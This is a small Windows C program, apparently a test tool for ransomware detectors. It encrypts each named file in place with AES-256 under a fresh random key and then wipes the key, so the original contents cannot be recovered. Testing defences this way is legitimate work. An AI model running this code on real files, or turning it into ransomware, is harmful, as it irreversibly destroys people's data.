#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")

static int encrypt_one(const char *path)
{
    HANDLE h;
    DWORD fsize, len, got = 0, put = 0;
    unsigned char *buf, *out, key[32], iv[16];
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    ULONG outlen = 0;

    h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return 2;

    fsize = GetFileSize(h, NULL);
    len = fsize & ~15u;
    if (len == 0) { CloseHandle(h); return 0; }

    buf = (unsigned char *)malloc(len);
    out = (unsigned char *)malloc(len);
    if (!buf || !out) { CloseHandle(h); free(buf); free(out); return 3; }

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    ReadFile(h, buf, len, &got, NULL);

    BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCryptGenRandom(NULL, iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(alg, &k, NULL, 0, key, 32, 0);
    BCryptEncrypt(k, buf, len, NULL, iv, 16, out, len, &outlen, 0);
    BCryptDestroyKey(k);
    BCryptCloseAlgorithmProvider(alg, 0);
    SecureZeroMemory(key, sizeof(key));

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    WriteFile(h, out, outlen, &put, NULL);
    CloseHandle(h);
    free(buf);
    free(out);
    return 0;
}

int main(int argc, char **argv)
{
    int i, rc = 0;

    if (argc < 2) {
        printf("usage: preserve_test <file> [<file> ...]\n");
        printf("  per-file fresh random AES-256 key, full in-place encrypt (uncatchable small-file case)\n");
        return 1;
    }
    for (i = 1; i < argc; i++) {
        int r = encrypt_one(argv[i]);
        if (r != 0) { printf("FAIL %d: %s\n", r, argv[i]); rc = r; }
        else printf("encrypted (fresh per-file key): %s\n", argv[i]);
        if (i < argc - 1)
            Sleep(500);
    }
    return rc;
}
